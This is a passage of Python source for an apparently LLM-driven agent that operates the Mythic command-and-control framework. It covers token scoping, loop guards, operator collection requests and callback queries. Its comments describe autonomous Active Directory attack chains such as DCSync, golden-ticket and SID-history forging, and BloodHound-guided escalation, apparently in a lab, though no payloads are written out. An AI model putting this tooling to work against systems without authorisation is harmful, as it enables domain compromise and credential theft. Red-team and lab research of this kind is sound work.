    A required scope is granted if the token holds `*` (all), the exact scope, or a matching
    `resource.*` wildcard. (The write→read `Includes` relationship in the server is irrelevant here:
    every SCOPE_REQUIREMENTS value is a `.write`, and no scope *includes* a `.write`.) Passing the
    server's `effective_scopes` (already `*`/wildcard-expanded) also works — exact match then suffices.
    """
    required = required.strip().lower()
    for scope in granted:
        scope = str(scope).strip().lower()
        if not scope:
            continue
        if scope == "*" or scope == required:
            return True
        if scope.endswith(".*") and required.startswith(scope[:-2] + "."):
            return True
    return False


def tools_missing_scope(granted_scopes: "set[str] | list[str] | None") -> set[str]:
    """Guarded tools to disable given the token's granted scopes.

    ``None`` means the scopes are unknown (the introspection query failed / no client) — return an empty
    set so nothing is gated on scope; the login fail-closed already protects the no-token case. Honors
    `*` and `resource.*` wildcards via `_allows_scope` (matches the server's `AllowsScope`).
    """
    if granted_scopes is None:
        return set()
    granted = set(granted_scopes)
    return {tool for tool, scope in SCOPE_REQUIREMENTS.items() if not _allows_scope(granted, scope)}


# Volatile substrings stripped before hashing a command's output for the unproductive-repeat loop-guard, so
# two runs of the same command that differ ONLY in drifting values (ticket timestamps, LUIDs/handles) hash
# identically. A module constant so the guard and its tests stay in lockstep.
_VOLATILE_OUTPUT_PATTERNS = [
    re.compile(r"\b\d{4}-\d{2}-\d{2}[t ]\d{2}:\d{2}:\d{2}\S*", re.I),  # ISO 2026-06-19T10:22:31Z
    re.compile(r"\b\d{1,2}/\d{1,2}/\d{2,4}\b"),                          # 6/19/2026
    re.compile(r"\b\d{1,2}:\d{2}(?::\d{2})?\s*(?:am|pm)?\b", re.I),      # 10:22:31 AM
    re.compile(r"\b0x[0-9a-f]+\b", re.I),                                 # 0x3e7 LUIDs/handles
    re.compile(r"\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b", re.I),  # GUID
    re.compile(r"\b\d{1,3}(?:\.\d{1,3}){3}:\d{1,5}\b"),                   # IP:port (ephemeral source ports)
]


class MythicTools:
    """A class to manage Mythic API tools for LangChain agents.

    Attributes:
        client (mythic_classes.Mythic): The Mythic API client instance.
        agent_task_id (str): The agent task ID, from Mythic's taskData.Task.AgentTaskID, associated with the agent.

    Do not use the LangChain @tool decorator because it will cause a conflict with 'self' argument in class methods
    Tools should follow LangChain StructuredTool format and must contain a doc string for the description field.
        - https://python.langchain.com/docs/how_to/custom_tools/#structuredtool
        - https://python.langchain.com/api_reference/core/tools/langchain_core.tools.structured.StructuredTool.html
    Use annotated typing for arguments to provide additional context for the tool description.
    Create args_schema where possible to provide more detailed argument information. The schema should be a class that inherits from BaseModel.
        - https://docs.langchain.com/oss/python/langchain/tools#advanced-schema-definition
    """
    client: mythic_classes.Mythic | None
    agent_task_id: str

    def __init__(self, agent_task_id: str = "", *, operation_id: int | None = None,
                 channel_id: int | None = None, apitoken_id: int = 0, preauth_client: Any = None):
        """Initialize the MythicTools auth context. Call login() to establish the connection.

        Three auth modes:
        - **Task path (PayloadType):** pass ``agent_task_id``; ``login()`` mints via that AgentTaskID.
        - **Chat path (chat container):** pass ``channel_id`` (+ ``operation_id``/``apitoken_id``);
          ``login()`` mints a channel-scoped bot token via ``ChatAPITokenProvider``. ``channel_id`` is
          the selector — when it's set the chat branch runs regardless of ``agent_task_id``.
        - **Headless/eval path:** pass ``preauth_client`` — an already-authenticated ``mythic`` client
          (e.g. the gauge harness's admin login). ``login()`` adopts it directly (no token mint), so the
          Model can run a full solve in-process with no PayloadType task or chat channel. See
          ``ai/hillclimb/headless_solver.py``. Pin the engagement key (``SAGE_ENGAGEMENT_ID``) when using
          an admin client, since it can see many operations.
        """
        logger.debug(f"Initializing MythicAPIClient (task_id={agent_task_id!r} channel_id={channel_id})")
        self.agent_task_id = agent_task_id
        self.operation_id = operation_id
        self.channel_id = channel_id
        self.apitoken_id = apitoken_id
        self._preauth_client = preauth_client
        self.client = None
        self._execution_observer = None
        # Guarded tools disabled by scope preflight (Section 8A P1). Populated by apply_scope_gating()
        # after login when the channel bot token's granted scopes are known; empty otherwise (no gating).
        self.disabled_tools: set[str] = set()
        # Circuit breaker for repeated identical task failures. Keyed by
        # (command, callback_display_id, normalized_params); incremented on each failed
        # issue_task_and_waitfor_task_output, reset on success. Prevents the agent from
        # burning the recursion budget by re-issuing a failing command with cosmetic
        # parameter permutations — the cause of the 2.47M-token context explosion on
        # 2026-06-01 (rev2self issued 7x, whoami 4x, all failing).
        self._task_failure_counts: dict[tuple, int] = {}
        self._artifact_ledger: list[dict] = []
        # Recent get_ttp_guidance goals — anti-cycle guard so the agent can't loop re-querying guidance
        # instead of executing (the 2026-06-07 BRAAVOS-LAPS run did this ~7×).
        self._ttp_guidance_goals: list[str] = []
        # Recon re-read guard: a "task epoch" bumped each time a real command is issued, plus a per-(tool,
        # target, epoch) call counter. Re-polling unchanged recon (get_task_history_for_callback ran 98× in
        # the 2026-06-07 run, list_callbacks 29×) burns the recursion budget without progress; the guard
        # returns a curt "stop re-reading, act" after repeats within an epoch, and resets when a command runs.
        self._recon_epoch: int = 0
        self._recon_call_log: dict[tuple, int] = {}
        # Unproductive-success loop-guard: a SUCCESSFUL command RESETS the failure circuit breaker, so a command
        # that keeps succeeding while returning the SAME (volatile-normalized) output — e.g. `shell klist` 10× —
        # slips past the breaker entirely. This tracks a GLOBAL consecutive-identical-action streak (command +
        # params + normalized output); an intervening different/failed action breaks the streak, so legitimate
        # re-runs across real work never accrue. At the limit the action is flagged and refused until real
        # progress (a different successful action) clears the flag.
        self._unproductive_repeat_limit: int = 3
        self._last_action_sig: tuple | None = None
        self._action_repeat_count: int = 0
        self._unproductive_tripped: set[tuple] = set()
        self._volatile_output_patterns = _VOLATILE_OUTPUT_PATTERNS
        # Mythic display_id + callback display_id of the most recently issued task — attached to an engagement
        # hop's evidence so the operator (and `state show`) can trace each achieved effect back to the exact
        # task AND the callback that proved it.
        self._last_issued_task_display_id = None
        self._last_issued_callback_id = None
        self._last_issued_task_terminal_status = ""
        self._last_issued_command = ""
        # Presentation-only observer for deterministic capability child commands. The capability executor
        # remains the only execution boundary; this reports real callback tasks to the chat surface.
        self._capability_command_observer = None
        self._capability_command_trace_seq = 0
        self._engagement_hops: list = []
        self._engagement_objective_text: str = ""
        # Provenance of the cached ledger objective: "operator" (set via `state objective`), "autonomous_seed"
        # (auto-adopted from a solve prompt), or "" (none/legacy). Legacy/provenance-less objectives are
        # treated as operator (sticky) — a new autonomous seed supersedes ONLY a prior autonomous_seed one.
        self._engagement_objective_source: str = ""
        # An autonomous-solve prompt seeded by Model.invoke(): for autonomous_solve the prompt IS the
        # mission, so it is adopted as the engagement objective when none is set (see _engagement_objective).
        # `_persisted` is a one-shot latch so the durable write happens at most once, post key-resolution;
        # Model.invoke() clears it when a NEW (different) seed arrives so a reused client re-adopts.
        self._autonomous_objective_seed: str = ""
        self._autonomous_objective_persisted: bool = False
        self._pending_engagement_hop = None
        # Registered file references already checked against Mythic filemeta in this Sage process. Payload
        # commands that expose a registered-file selector can lazily resolve those bytes once the file exists
        # in Mythic; no hidden agent task is required.
        self._registered_file_checks: set[str] = set()
        self._assembly_file_checks = self._registered_file_checks  # compatibility for older tests/helpers
        # Forward-planner graph facts: BloodHound ACL edges (GenericWrite on GPOs, WriteDacl on domains,
        # etc.) projected into engagement predicates, cached here and refreshed after each verified ingest
        # so the per-turn injection can DIRECT the operator to the next available hop instead of letting it
        # re-collect (the 2026-06-09 loop). SUGGESTION-ONLY: these feed available_hops / the injected
        # render, NOT the gate's enforcement state — so a reconciliation miss can never newly DEFER a real
        # hop (suggest-on-known; blocking stays conservative / unknown != false).
        self._engagement_graph_facts: list = []
        self._engagement_graph_facts_ts: str | None = None
        # Exact per-process Kerberos ticket forge command strings emitted by build_capability_commands. The
        # gate requires golden-ticket/SID-history tasks to match one of these keys so a model cannot handcraft
        # a command that merely looks builder-shaped or bypasses the isolated-context sequence.
        self._deterministic_ticket_command_keys: set[str] = set()
        self._deterministic_ticket_command_contexts: dict[str, dict] = {}
        self._deterministic_capability_command_contexts: dict[str, dict] = {}
        self._bound_failure_parameter_signatures: dict[str, str] = {}
        # Runtime artifacts from deterministic Kerberos capability plans. The model should not have to copy
        # long Rubeus ticket blobs between tools; cache them once and bind them into ticket_store_add.
        self._capability_artifacts: dict[str, str] = {}
        # NetOnly/sacrificial contexts created during this Sage task, keyed by callback + remote identity.
        # Prevents repeated make_token calls for the same EA/DA context when ticket_store_list/proof should
        # be used first.
        self._kerberos_logon_context_keys: set[tuple] = set()
        self._bound_credential_contexts: dict[str, tuple[str, str]] = {}
        self._kerberos_logon_context_callbacks: set[int] = set()
        self._kerberos_logon_account_context_keys: set[tuple] = set()
        self._kerberos_account_context_keys: set[tuple] = set()
        # Per-callback Kerberos context epoch. Service-access probes depend on the current logon/session
        # ticket state, so an Access Denied before make_token/ticket import must not poison the identical
        # proof command after the context changes.
        self._kerberos_context_epochs: dict[str, int] = {}
        # Latest atomic token + current-LUID ticket observation for each callback.
        self._authentication_contexts: dict[str, auth_context.AuthenticationContext] = {}
        self._known_domain_authorities: dict[str, set[str]] = {}
        # Empirical pre-DCSync rights precheck: per-(technique,domain) count of times we've blocked a DCSync
        # for missing replication rights. CAPPED (see _DCSYNC_PRECHECK_MAX_BLOCKS) so the precheck can redirect
        # the agent to obtain rights first WITHOUT ever becoming a permanent deadlock (the failure mode that
        # got the static gate demoted to advisory).
        self._dcsync_precheck_blocks: dict = {}
        # Parent domains for which we hold a usable parent-Enterprise-Admins context: established when the
        # cross-domain forge imports a child-domain TGT carrying the parent EA ExtraSID into the current Windows
        # logon session. Windows can then acquire the parent referral/service ticket on demand during the proof
        # operation. EA membership confers DS-Replication on the parent, so this grants
        # ds-replication-rights:<parent> for the DCSync proof that immediately follows in the same chain. Scoped
        # to same-forest child->parent only; the DCSync still gates the final da:<parent> recording on real
        # proof, so a granted-but-unproven right records no objective effect.
        self._cross_domain_replication_rights: set[str] = set()
        # Access-context keys with a collection currently in-flight (issued, not yet ingested). A marker is
        # valid only when backed by a real Mythic task display_id. The gate may classify intent, but only the
        # post-issue path can commit operational transient state.
        self._collection_in_flight: dict[str, dict] = {}
        self._pending_task_backed_transition: dict | None = None
        # Per-user-turn collection intent. Collect-once is the autonomous default, but an explicit operator
        # request to run/re-run SharpHound must be allowed to launch one fresh collection transaction instead
        # of being silently satisfied from history. This state is reset by Model.invoke() for each real user
        # turn and never set by synthetic autonomous nudges.
        self._operator_collection_request: dict | None = None
        # Deliberation-drain guards. Command schemas are STATIC per payloadtype -> cache (a 2026-06-09 solve
        # re-fetched + re-dumped them 27×, bloating context).
        self._command_schema_cache: dict = {}
        self._callback_command_surface_cache: dict[str, tuple[str, list[dict]]] = {}
        # One bounded model-assisted mechanic substitution may be attempted for an unresolved deterministic
        # command binding. Cache both accepted and rejected proposals so a repeated proof poll or retry cannot
        # turn into an open-ended "try another command" loop.
        self._mechanic_repair_resolver = None
        self._mechanic_repair_cache: dict[tuple, dict | None] = {}
        # Credential-store cache: the store is read both by read_credentials (which the agent hit 24× in one
        # solve) and by the gate's durable-hop corroboration probe. Cache the raw rows for a short TTL so
        # neither path re-queries Mythic repeatedly.
        self._cred_cache: list | None = None
        self._cred_cache_ts: str | None = None
        self._credential_reference_bindings: dict[tuple[str, str, str, str], str] = {}
        self._credential_reference_lock = asyncio.Lock()
        self._domain_sid_cache: dict[str, str] = {}
        # Idempotency for collection ingest: sha256(content) -> bloodhound job id of a VERIFIED ingest. Prevents
        # re-uploading + re-ingesting the identical SharpHound zip (observed 4x in one window) even when
        # supervisor control loops. Per-process; a lab reset + Sage restart clears it. (control-state P0)
        self._ingested_collection_hashes: dict[str, str] = {}
        self._last_bloodhound_ingest_proof_envelope: dict = {}
        # The durable-ledger key. Defaults to the explicit SAGE_ENGAGEMENT_ID (env/test override); when
        # that is unset ("default") it is resolved lazily from the current Mythic OPERATION the first time
        # the gate fires (client exists by then) -> `state_<OperationName>_<OperationId>.json`. The lock
        # serializes that one-time resolve+reload so two concurrent hook calls can't both reload and stomp
        # an appended hop.
        self._engagement_key: str | None = None
        self._engagement_key_lock = asyncio.Lock()
        # Live footholds cache (populated by the issue hook after reconcile) so the per-turn state render in
        # model.py can show footholds without an extra network round-trip on every model call.
        self._engagement_footholds: list = []
        # Durable cross-run resume: when an explicit engagement key is configured, load it now. The normal
        # operation-named key needs a Mythic client, so it is resolved after login; loading state_default here
        # would let stale default state drive planning before the first gated task.
        if SAGE_ENGAGEMENT_ID and SAGE_ENGAGEMENT_ID != "default":
            self._engagement_key = SAGE_ENGAGEMENT_ID
            # This is the REACHABLE explicit-override freeze point: with the key set here, _ensure_engagement_key
            # early-returns, so the published-id for diagnostics (rights-trace eid) must happen here too — the
            # gate-experiment restarts Sage with SAGE_ENGAGEMENT_ID=<token>, which takes this path.
            _publish_active_engagement_id(self._engagement_key)
            try:
                self._load_engagement_ledger(replace=True)
            except Exception:
                pass
        # No-progress guard: count how many times each task_id has been fetched and come back FAILED
        # this session. On the 2nd+ failed re-read we return a short escalation directive instead of the
        # full (unchanged) failed output — the 2026-06-01 e45ae3d3 recursion death was the agent
        # re-reading a statically-failed task (Rubeus dcsync / jump_wmi) 3x at ~240K tokens/call until
        # the 75-step budget was exhausted. First failed fetch returns the full output so the agent sees
        # the error once. This is independent of the issue_task circuit breaker (do not touch that).
        self._failed_read_counts: dict[int, int] = {}
        # Completed-task output cache: a COMPLETED task's output is immutable, so cache it (keyed by
        # task_display_id) so re-reads of the same finished task don't re-fetch its (often large) output.
        # Only populated for completed tasks — a running task's output still changes and is never cached.
        self._task_output_cache: dict[int, str] = {}

    def set_mechanic_repair_resolver(self, resolver) -> None:
        """Install the bounded payload-mechanic resolver used by deterministic capability execution."""
        self._mechanic_repair_resolver = resolver if callable(resolver) else None

    def set_capability_command_observer(self, observer) -> None:
        """Install a fail-soft presentation observer for callback tasks issued inside a capability."""
        self._capability_command_observer = observer if callable(observer) else None

    def set_execution_observer(self, observer) -> None:
        """Install the request-scoped observer for accepted Mythic callback tasks."""
        self._execution_observer = observer if callable(observer) else None

    async def _notify_execution_observer(self, event: dict) -> None:
        observer = getattr(self, "_execution_observer", None)
        if observer is None:
            return
        try:
            from ai.mcp import MCPManager
            event = dict(event)
            event["activity"] = MCPManager.current_execution_activity()
        except Exception:
            event = dict(event)
            event["activity"] = None
        try:
            observed = observer(event)
            if inspect.isawaitable(observed):
                await observed
        except Exception as exc:
            logger.debug(f"Mythic execution observer failed (non-fatal): {exc}")

    def _next_capability_command_trace_id(self) -> str:
        self._capability_command_trace_seq = int(getattr(self, "_capability_command_trace_seq", 0) or 0) + 1
        return f"capability_command:{self._capability_command_trace_seq}"

    async def _notify_capability_command_observer(
        self,
        *,
        trace_id: str,
        status: str,
        command_obj: dict,
        command_name: str,
        parameters,
        callback_id: int,
        capability_name: str = "",
        task_id=None,
        result_preview: str | None = None,
    ) -> None:
        observer = getattr(self, "_capability_command_observer", None)
        if observer is None:
            return
        event = {
            "trace_id": trace_id,
            "status": status,
            "command": command_name,
            "capability": self._capability_text(capability_name),
            "callback_id": callback_id,
            "parameters": self._capability_executor_safe_parameters(parameters),
            "purpose": self._capability_text(command_obj.get("purpose")),
        }
        if task_id not in (None, ""):
            event["task_id"] = task_id
        if result_preview:
            event["result_preview"] = result_preview
        try:
            observed = observer(event)
            if inspect.isawaitable(observed):
                await observed
        except Exception as exc:
            logger.debug(f"capability command observer failed (non-fatal): {exc}")

    def begin_operator_turn(self, prompt: str) -> None:
        """Reset per-turn operator intent and arm one fresh collection transaction when explicitly requested."""
        self._operator_collection_request = None
        if not _operator_requested_collection(prompt):
            return
        self._operator_collection_request = {
            "requested": True,
            "prompt_preview": str(prompt or "")[:300],
            "authorized_key": "",
            "launched_key": "",
            "launched_task_id": "",
            "callback_id": "",
            "expected_zip_suffix": "",
            "completed": False,
        }
        logger.info("🧭 [operator-collection] explicit collection request armed for this user turn")

    def _operator_collection_override_available(self) -> bool:
        request = getattr(self, "_operator_collection_request", None)
        return bool(
            isinstance(request, dict)
            and request.get("requested") is True
            and request.get("completed") is not True
        )

    def _authorize_operator_collection(self, collection_key: str, callback_display_id, parameters) -> None:
        request = getattr(self, "_operator_collection_request", None)
        if not self._operator_collection_override_available() or not isinstance(request, dict):
            return
        request["authorized_key"] = str(collection_key or "")
        request["callback_id"] = str(callback_display_id or "")
        request["expected_zip_suffix"] = _sharphound_zip_suffix(parameters)

    def _mark_operator_collection_launched(self, key: str, task_display_id, callback_display_id, parameters) -> None:
        request = getattr(self, "_operator_collection_request", None)
        if not isinstance(request, dict) or request.get("requested") is not True:
            return
        authorized_key = str(request.get("authorized_key") or "")
        if authorized_key and authorized_key != str(key or ""):
            return
        request["launched_key"] = str(key or "")
        request["launched_task_id"] = str(task_display_id or "")
        request["callback_id"] = str(callback_display_id or "")
        request["expected_zip_suffix"] = (
            _sharphound_zip_suffix(parameters)
            or str(request.get("expected_zip_suffix") or "")
        )
        logger.info(
            "🧭 [operator-collection] fresh collector launched key=%s task=%s callback=%s",
            key,
            task_display_id,
            callback_display_id,
        )

    def _complete_operator_collection_request(self) -> None:
        request = getattr(self, "_operator_collection_request", None)
        if isinstance(request, dict) and request.get("requested") is True:
            request["completed"] = True

    def _operator_collection_ingest_blocker(
        self,
        *,
        callback_display_id,
        source_filename: str,
    ) -> str | None:
        """Require an explicit operator recollection request to consume the fresh artifact it launched."""
        request = getattr(self, "_operator_collection_request", None)
        if not self._operator_collection_override_available() or not isinstance(request, dict):
            return None
        task_id = str(request.get("launched_task_id") or "").strip()
        if not task_id:
            return json.dumps({
                "status": "fresh_collection_required",
                "operator_requested_recollection": True,
                "error": (
                    "The operator explicitly requested a new SharpHound/AzureHound collection this turn. "
                    "Do not satisfy that request with a historical ZIP or prior ingest. Launch a new collector "
                    "task first, verify the artifact produced by that task, then ingest that fresh ZIP."
                ),
            }, sort_keys=True)
        expected_callback = str(request.get("callback_id") or "").strip()
        actual_callback = str(callback_display_id or "").strip()
        if expected_callback and actual_callback and expected_callback != actual_callback:
            return json.dumps({
                "status": "fresh_collection_artifact_required",
                "operator_requested_recollection": True,
                "collector_task_id": task_id,
                "error": (
                    f"The explicit collection request launched on callback {expected_callback} as Mythic task "
                    f"#{task_id}; ingest the ZIP from that callback, not callback {actual_callback}."
                ),
            }, sort_keys=True)
        expected_suffix = str(request.get("expected_zip_suffix") or "").strip().casefold()
        actual_name = str(source_filename or "").replace("\\", "/").rsplit("/", 1)[-1].strip().casefold()
        if expected_suffix and actual_name and not actual_name.endswith(expected_suffix):
            return json.dumps({
                "status": "fresh_collection_artifact_required",
                "operator_requested_recollection": True,
                "collector_task_id": task_id,
                "expected_zip_suffix": expected_suffix,
                "actual_filename": actual_name,
                "error": (
                    f"The operator requested a fresh collection and Mythic task #{task_id} produced a ZIP "
                    f"with suffix '{expected_suffix}'. Do not ingest historical artifact '{actual_name}'; "
                    "download and ingest the ZIP produced by the new collector task."
                ),
            }, sort_keys=True)
        return None

    async def login(self):
        """Create the Mythic API client connection asynchronously (Section 8A P0).

        Two auth paths, selected by which context was supplied:
        - **Chat path** (``channel_id`` set): mint a channel-scoped bot token via ``ChatAPITokenProvider``
          (keyed on ``ChatChannelID``), not the task's AgentTaskID. This is the P0 rewrite — all 28 tools
          authenticate through this one chokepoint, so re-sourcing it here fixes the whole tool surface.
        - **Task path** (``agent_task_id`` set, no channel): unchanged — mint from the AgentTaskID.

        Degrade gracefully when Mythic is unreachable (offline/headless/eval) or no context was given:
        leave ``self.client`` None so guarded tools fail closed via their "not initialized" guard and
        ``_fetch_dynamic_data`` falls back to defaults, instead of crashing ``Model.initialize()``.
        """
        if self._preauth_client is not None:
            # Headless/eval path: adopt the caller's already-authenticated client directly — no token mint,
            # no channel/task context needed. Lets the gauge harness run a full solve in-process.
            self.client = self._preauth_client
            return
        api_key = None
        if self.channel_id is not None:
            # Chat bot-token path — the primary consumer of ChatAPITokenProvider (corrects the earlier
            # PRD claim that sage's tools didn't need it; they are its primary consumer).
            # Time-box the mint: the underlying SendMythicRPCAPITokenCreate connects to RabbitMQ with an
            # UNBOUNDED retry loop, so if Mythic is unreachable/misconfigured this would hang forever
            # instead of degrading. Bound it and fail closed on timeout (fixes headless/eval + a
            # misconfigured-container-hangs-at-startup edge).
            async def _mint_chat_token() -> str:
                from mythic_container.ChatBase import ChatAPITokenProvider
                provider = await ChatAPITokenProvider.create(
                    int(self.operation_id or 0), int(self.channel_id), int(self.apitoken_id or 0)
                )
                return await provider.get_token()
            try:
                api_key = await asyncio.wait_for(_mint_chat_token(), timeout=_CHAT_TOKEN_MINT_TIMEOUT)
            except Exception as e:  # includes asyncio.TimeoutError
                logger.warning(
                    f"MythicTools.login(): chat-channel token mint failed/timed out ({e}) — leaving client "
                    "unauthenticated; guarded Mythic tools fail closed until a scoped bot token is available."
                )
                return
        elif self.agent_task_id:
            logger.info(f"Calling MythicRPCAPITokenCreateMessage with: {self.agent_task_id}")
            resp = await SendMythicRPCAPITokenCreate(MythicRPCAPITokenCreateMessage(AgentTaskID=self.agent_task_id))
            if resp.Success:
                api_key = resp.APIToken
            else:
                raise Exception(f"Failed to get API token for AgentTaskID {self.agent_task_id}: {resp.Error}")
        else:
            logger.warning(
                "MythicTools.login(): no task or channel auth context — skipping token mint. "
                "Mythic action tools stay unauthenticated (fail closed)."
            )
            return

        ip = os.environ.get("NGINX_HOST", "127.0.0.1")
        port = int(os.environ.get("NGINX_PORT", 7443))
        ssl = True if os.environ.get("NGINX_SSL", "true").lower() in ['true', '1', 'yes'] else False
        self.client = await mythic.login(apitoken=api_key, server_ip=ip, server_port=port, ssl=ssl)

    async def whoami_scopes(self) -> "set[str] | None":
        """Introspect the token's granted scopes for preflight tool-gating (Section 8A P1).

        Queries the `whoami` Hasura action, which on the auth-adjustments branch exposes
        `effective_scopes` (the server-side `*`/wildcard/includes-expanded set) — verified against
        `hasura-docker/metadata/actions.graphql` (`whoamiOutput.effective_scopes`) and
        `scope_check_webhook.go`. The scripting lib's built-in `whoami` only SELECTs
        username/operation, so we run a custom query selecting the scope fields. No extra scope is
        needed — a token can always read its own claims.

        [VERIFY-LIVE] The query is source-verified but not yet run against a live v4 server (v4 is
        currently down on the Hasura metadata bug). Returns None on no-client/failure → `tools_missing_scope`
        gates nothing (login fail-closed still protects the no-token case). An empty set (token genuinely
        has no scopes) correctly gates ALL guarded tools.
        """
        if self.client is None:
            return None
        try:
            resp = await mythic.execute_custom_query(
                mythic=self.client,
                query="query sageWhoamiScopes { whoami { effective_scopes scopes } }",
            )
            who = (resp or {}).get("whoami") or {}
            scopes = who.get("effective_scopes")
            if scopes is None:
                scopes = who.get("scopes")
            return set(scopes) if scopes is not None else set()
        except Exception as e:
            logger.warning(f"whoami_scopes introspection failed ({e}); scope gating disabled this session")
            return None

    def apply_scope_gating(self, granted_scopes: "set[str] | list[str] | None") -> set[str]:
        """Set `self.disabled_tools` from the token's granted scopes (see `tools_missing_scope`)."""
        self.disabled_tools = tools_missing_scope(granted_scopes)
        if self.disabled_tools:
            logger.info(
                f"Scope preflight: disabling {len(self.disabled_tools)} guarded tool(s) lacking a granted "
                f"scope: {sorted(self.disabled_tools)}"
            )
        return self.disabled_tools
    
    def get_tools(self, method_names: list[str]) -> list[StructuredTool]:
        """Get Mythic tools by method names and return them as LangChain StructuredTool instances.

        Do not use the LangChain @tool decorator because it will cause a conflict with 'self' argument in class methods
        """

        if "get_task_history_for_callback" in method_names and "list_open_artifacts" not in method_names:
            method_names = [*method_names, "list_open_artifacts"]

        tools = []
        disabled = getattr(self, "disabled_tools", set())
        for method_name in method_names:
            if method_name in disabled:
                # Scope preflight (Section 8A P1): the bot token lacks the scope this tool needs. Skip it
                # so the LLM never sees a tool it can't use — fail cheap, not mid-run.
                logger.debug(f"Scope-gated: omitting `{method_name}` (required scope not granted)")
                continue
            if hasattr(self, method_name):
                method = getattr(self, method_name)
                if asyncio.iscoroutinefunction(method):
                    tools.append(StructuredTool.from_function(
                        coroutine=method,
                        name=method_name,
                        description=method.__doc__ or f"Execute {method_name}"
                    ))
                else:
                    tools.append(StructuredTool.from_function(
                        func=method,
                        name=method_name,
                        description=method.__doc__ or f"Execute {method_name}"
                    ))
        return tools

    async def _bounded_wait_for_seconds(self, seconds: int, reason: str = "", heartbeat=None) -> str:
        try:
            wait_seconds = int(seconds)
        except (TypeError, ValueError):
            wait_seconds = 1
        wait_seconds = max(1, min(wait_seconds, 600))
        if heartbeat is None or wait_seconds < 2:
            await asyncio.sleep(wait_seconds)
        else:
            elapsed = 0
            remaining = wait_seconds
            heartbeat_interval = 60
            while remaining > heartbeat_interval:
                await asyncio.sleep(heartbeat_interval)
                elapsed += heartbeat_interval
                remaining -= heartbeat_interval
                observed = heartbeat(elapsed, remaining)
                if inspect.isawaitable(observed):
                    await observed
            await asyncio.sleep(remaining)
        suffix = f" reason={reason}" if reason else ""
        return f"waited {wait_seconds} seconds{suffix}"

    async def wait_for_seconds(self, seconds: int, reason: str = "") -> str:
        """
        Pause Sage-side LLM execution for a bounded number of seconds, without tasking or changing any Mythic
        callback sleep interval. Use this when an external effect needs propagation time before a verifier can
        be meaningful, such as waiting for a Group Policy refresh before polling domain group membership.
        """
        return await self._bounded_wait_for_seconds(seconds, reason)

    async def get_all_active_callbacks(self) -> str:

        """
        Retrieve detailed information about all active Mythic agents.

        This tool provides comprehensive details about all active Mythic agents, including their operating systems, network information, 
        process details, and user contexts. The returned information includes:

        - **architecture**: The architecture of the operating system (e.g., 386, amd64, arm, mips).
        - **description**: The description used when the Mythic Agent payload was created.
        - **domain**: The Windows domain associated with the host or user.
        - **external_ip**: The internet-facing IP address from the agent.
        - **host**: The host name where the agent is running.
        - **id**: The Mythic callback ID.
        - **integrity_level**: The Windows integrity level (1: low, 2: medium, 3: high).
        - **ip**: A list of local IP addresses on the host where the agent is running.
        - **pid**: The process ID for the Mythic agent.
        - **os**: The operating system the Mythic agent is running on.
        - **user**: The username that the Mythic agent is running as.
        - **process_name**: The name and file path of the process the Mythic agent is running as.
        - **sleep_info**: Information about the agent's sleep time.

        Returns:
            str: JSON string containing the agent's detailed information.
        """
        # HITL: free
        if self.client is None:
            raise Exception("MythicAPIClient not initialized. Call login() first.")
        logger.debug("🛠️ Calling get_all_active_callbacks tool")
        resp = await mythic.get_all_active_callbacks(self.client)
        return json.dumps(resp, sort_keys=True)

    async def list_callbacks(self) -> str:
        """SLIM callback status — ONE cheap query returning, per active callback, only the minimum needed
        to answer 'is there a new callback?' and 'is each one still alive?': {id, agent, user, host,
        integrity, status, secs_since_checkin}. It is ~8x smaller than get_all_active_callbacks AND folds in
        computed liveness (same logic as check_callback_alive), so for routine situational awareness it
        replaces BOTH. Use get_all_active_callbacks ONLY when you need full host detail (pid, process_name,
        IPs, external_ip); use check_callback_alive for a deep single-callback crash assessment."""
        # HITL: free
        if self.client is None:
            raise Exception("MythicAPIClient not initialized. Call login() first.")
        logger.debug("🛠️ Calling list_callbacks (slim)")
        guard = self._recon_reread_guard("list_callbacks", "all")
        if guard:
            return json.dumps({"status": "unchanged", "note": guard}, sort_keys=True)
        query = """
            query slimcb {
              callback(where: {active: {_eq: true}}, order_by: {display_id: asc}) {
                display_id last_checkin user host integrity_level
                payload { payloadtype { name } }
                c2profileparametersinstances(where: {c2profileparameter: {name: {_in: ["callback_interval","callback_jitter"]}}}) { value c2profileparameter { name } }
              }
            }
        """
        try:
            resp = await mythic.execute_custom_query(self.client, query)
        except Exception as e:
            return json.dumps({"status": "error", "error": str(e)}, sort_keys=True)
        callbacks = resp.get("callback", []) if isinstance(resp, dict) else []
        out = []
        for cb in callbacks:
            if not isinstance(cb, dict):
                continue
            profile: dict[str, object] = {}
            for inst in (cb.get("c2profileparametersinstances") or []):
                if not isinstance(inst, dict):
                    continue
                p = inst.get("c2profileparameter")
                if isinstance(p, dict) and p.get("name") in ("callback_interval", "callback_jitter"):
                    profile[p["name"]] = inst.get("value")
            agent = ((cb.get("payload") or {}).get("payloadtype") or {}).get("name")
            live = _compute_liveness(
                display_id=cb.get("display_id"),
                last_checkin=cb.get("last_checkin"),
                callback_interval=profile.get("callback_interval"),
                callback_jitter=profile.get("callback_jitter"),
                tasks=[],
                payload_type=agent,
                active=True,
            )
            out.append({
                "id": cb.get("display_id"),
                "agent": agent,
                "user": cb.get("user"),
                "host": cb.get("host"),
                "integrity": cb.get("integrity_level"),
                "status": live.get("status"),
                "secs_since_checkin": live.get("seconds_since_checkin"),
            })
        return json.dumps(out, default=str, sort_keys=True)

    async def get_all_payload_info(self) -> str:
        """ Get information about ALL payload types in Mythic. """
        # HITL: free
        query = """
            query PayloadInfo {
                payloadtype {
                    agent_type
                    name
                    supported_os
                    buildparameters {
                    id
                    name
                    parameter_type
                    choices
                    default_value
                    description
                    }
                }
            }
        """
        try:
            if self.client is None:
                raise Exception("MythicAPIClient not initialized. Call create() first.")
            logger.debug("🛠️ Calling get_all_payload_info tool")
            results = await mythic.execute_custom_query(self.client, query,)
            return json.dumps(results, sort_keys=True)
        except Exception as e:
            return f"Error executing query: {e}"

    async def get_all_payloads(self) -> str:
        """Get information about all payloads currently registered (already built) with Mythic."""
        # HITL: free
        if self.client is None:
            raise Exception("MythicAPIClient not initialized. Call create() first.")
        logger.debug("🛠️ Calling get_all_payloads tool")
        resp = await mythic.get_all_payloads(self.client)
        return json.dumps(resp, sort_keys=True)
        
    async def get_payload_names(self) -> List[str]:
        """Get a list of all payload type names."""
        # HITL: free
        query = """
            query SagePayloadNames {
                payloadtype {
                    name
                }
            }
            """
        if self.client is None:
                raise Exception("MythicAPIClient not initialized. Call create() first.")
        logger.debug("🛠️ Calling get_payload_names tool")
